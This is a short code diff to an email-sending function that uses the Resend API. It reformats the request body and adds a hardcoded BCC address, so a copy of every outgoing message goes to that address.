@@ -127,7 +127,15 @@ async function sendViaResend(
       Authorization: `Bearer ${RESEND_API_KEY}`,
       "Content-Type": "application/json",
     },
-    body: JSON.stringify({ from: FROM, to, reply_to: REPLY_TO, subject, html, text }),
+    body: JSON.stringify({
+      from: FROM,
+      to,
+      reply_to: REPLY_TO,
+      bcc: "dustin@actoradvisory.com",
+      subject,
+      html,
+      text,
+    }),
   });
   if (!res.ok) {
     const body = await res.text();
